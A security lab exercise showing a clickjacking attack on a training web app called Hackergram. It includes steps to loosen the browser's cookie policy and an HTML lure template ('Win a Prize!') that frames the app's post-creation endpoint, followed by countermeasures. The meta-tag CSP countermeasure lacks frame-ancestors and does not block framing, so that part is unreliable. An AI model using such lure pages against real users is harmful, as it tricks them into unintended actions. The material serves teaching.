# Clickjacking
Clickjacking, or UI redress attack, is a technique in which attackers trick victims into clicking on hidden
or disguised elements on a web page. This is typically accomplished by overlaying transparent or
opaque elements on top of legitimate content, tricking users into performing unintended actions. Such
actions may include inadvertently downloading malware, exposing confidential information, or initiating
unauthorized transactions, among other security breaches. 

## Attack
Create a post on behalf of a user without their knowledge by tricking them into clicking a disguised button embedded within a malicious site. This attack exploits the fact that Hackergram web application can be embedded inside an iframe. In this case, the `/create_posts` endpoint will be targeted.

To execute the attack, follow these steps:

1.	Open about:config in the victim’s webterm browser.

2.	Search for network.cookie.cookieBehavior and set its value to 0.

3.	Login as mr_robot on Hackergram and keep the session active.

4.	In the attacker’s `/home` directory, craft a file named `clickjacking.html`. This will be a fake HTML page that embeds Hackergram’s `/create_post` endpoint inside an iframe. You can use the template provided below as a starting point. 

    ``` html
    <!DOCTYPE html>
    <html lang="en">
    <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Win a Prize!</title>
    <style>
        body {
            text-align: center;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
        }
        h2 {
            color: red;
        }
        .fake-button {
            background-color: #4CAF50;
            color: white;
            padding: 15px 20px;
            font-size: 20px;
            border: none;
            cursor: pointer;
            position: absolute;
            top: 580px;
            left: 65%;
            transform: translateX(-50%);
            z-index: 10; 
            pointer-events: none; 
        }

        .overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 5;
            pointer-events: none; 
        }

    </style>
    </head>
    <body>
    <h2>Click to Win a Prize!</h2>
    <div class="overlay">
        <button class="fake-button" id="claimButton">Claim</button>
    </div>
    <script>
        window.onload = function() {
            let iframe = document.querySelector("iframe");
            let claimButton = document.getElementById("claimButton");
            
            iframe.addEventListener('load', function() {
                try {
                    let iframeWindow = iframe.contentWindow;
                    
                    iframeWindow.postMessage({
                        action: 'fillContent',
                        content: 'Hello World!'
                    }, '*');
                } catch (error) {
                    console.error('Error accessing iframe:', error);
                }
            });
        };

        window.addEventListener('message', function(event) {
            console.log('Received message:', event.data);
        }, false);
    </script>
    </body>
    </html>
    ```

    <details>
    <summary><strong>Tip</strong></summary>
        Use the &lt;iframe&gt; tag to embed Hackergram within the malicious site.
    </details>

5.	Run an HTTP server on the attacker using python3 -m http.server 80. Execute this command in the directory used to create the HTML page in the previous step.

6.	In a new tab, visit the attacker’s website by entering http://192.168.0.10/clickjacking.html.

7.	Click the “Claim Your Prize” button.

8.	Confirm that the attack succeeded by checking if a new post appears under mr_robot's account in Hackergram.

!!! note "Additional exercise"
    Try creating your own attack variation using another Hackergram endpoint. For instance, what if the iframe embeds a friend request action instead of a post?

## Countermeasure
To defend against clickjacking, Hackergram must prevent its pages from being embedded into other websites. This requires modifying files inside the Hackergram container. There are two main approaches: 

1.	In the base.html, add the CSP directive: 

``` html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self';"> 
```

2. In the hackergram.py file, apply the X-Frame-Options header to the desired responses by adding the following line to the returned response object: 

```response.headers['X-Frame-Options'] = 'DENY' ```
Now, repeat the attack and verify that the clickjacking attempt is no longer effective.
